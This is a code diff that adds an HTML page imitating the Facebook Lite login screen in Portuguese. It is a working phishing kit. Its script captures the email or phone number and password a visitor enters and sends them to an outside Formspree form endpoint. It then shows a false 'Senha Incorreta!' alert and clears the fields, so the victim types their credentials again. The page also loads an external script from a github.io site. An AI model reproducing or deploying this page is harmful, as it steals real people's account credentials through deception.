@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkbPf6A7tl21KJxFRS7Ou3ss9GgyDsbeuAUw&s" sizes="16×16" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <title>Facebook Lite</title>
+</head>
+<body>
+
+<style>
+html, body {
+    background-color: #fff;
+    margin:0 auto;
+    width: 100%;
+    display:flex;
+    justify-content:center;
+    position:absolute;
+  }
+  
+  p {
+    text-align:center;
+    font-family: sans-serif;
+    font-size: 12px;
+    position:relative;
+    margin-bottom: 40px;
+  }
+
+  .facebook-board {
+    margin:0 auto;
+    width: 100%;
+    display:flex;
+    justify-content:center;
+    position: absolute;
+    height: 100%;
+  }
+
+  .logo {
+    top:30px;
+    height:45px;
+    width: 45px;
+    margin:25px;
+    display:flex;
+    justify-content: center;
+    border-radius: 50%;
+    border:1px solid #9D9D9D;
+  }
+  form {
+    top:150px;
+    width:100%;
+    position:absolute;
+    
+  }
+  input {
+    margin:25px;
+    padding:15px;
+    display:flex;
+    border-radius:10px;
+    justify-content: center;
+    width:80%;
+    background-color:#FFFFFF;
+    border:1px solid #999999;
+  }
+  input::hover {
+    border:1px solid #999999;
+  }
+  input::focus {
+    border:1px solid #999999;
+    outline:none;
+  }
+  ::placeholder {
+    font-weight: bolder:
+  }
+  button {
+    margin:25px;
+    padding:10px;
+    display:flex;
+    border-radius:25px;
+    justify-content: center;
+    width:86%;
+    pointer:none;
+    color:#ffffff;
+    font-weight: bolder;
+    background-color:#0865FE;
+    border:1px solid #0865FE;
+  }
+  .account-maker {
+    top:470px;
+    margin:25px;
+    padding:7px;
+    display:flex;
+    border-radius:25px;
+    justify-content: center;
+    width:86%;
+    pointer:none;
+    position:absolute;
+    color:#2876FF;
+    font-weight: bolder;
+    background-color:#FFFFFF;
+    border:1px solid #2876FF;
+  }
+  .forget {
+    font-size: 15px;
+   font-weight: bold;
+   color:#4E4E4E;
+  }
+</style>
+  <div class="facebook-board">
+    
+    <header>
+      <p>Português (Brasil) V</p>
+<center>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/75/Facebook_Lite_logo.svg/2048px-Facebook_Lite_logo.svg.png" alt="facelogo" class="logo">
+</center>
+    </header>
+    <form id="meuForm">
+      <label for="email:">
+        <input type="text" name="email:" required placeholder="Número do celular ou email">
+      </label>
+      <label for="senha:">
+        <input type="password" name="senha:" required placeholder="Senha">
+      </label>
+      
+      
+      <button type="submit">Entrar</button>
+      <p class="forget">Esqueceu a senha?</p>
+      
+    </form>
+    <button id="btn4" class="account-maker">Criar conta</button>
+  </div>
+<style type="text/css" media="all">
+img.meta {
+position:fixed;
+bottom:10px;
+margin:none;
+padding:none;
+}
+</style>
+<img class="meta" width="60px" height=50px src="assets/img/logo/Meta.png" alt="meta">
+
+<script>
+document.getElementById("meuForm").addEventListener("submit", function(e) {
+  e.preventDefault(); // Impede o envio padrão do formulário
+
+  const form = e.target;
+  const data = new FormData(form);
+
+  fetch("https://formspree.io/f/meqyekvp", {
+    method: "POST",
+    body: data,
+    headers: {
+      'Accept': 'application/json'
+    }
+  }).then(response => {
+    if (response.ok) {
+      alert("Senha Incorreta!");
+      form.reset(); // limpa os campos
+    } else {
+      alert("Erro ao enviar. Tente novamente.");
+    }
+  }).catch(error => {
+    console.error("Erro:", error);
+    alert("Erro inesperado.");
+  });
+});
+</script>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <script src="https://jack-sbraincancer.github.io/Facebook-Login-Page/script.js"></script>
+</body>
+
+</html>
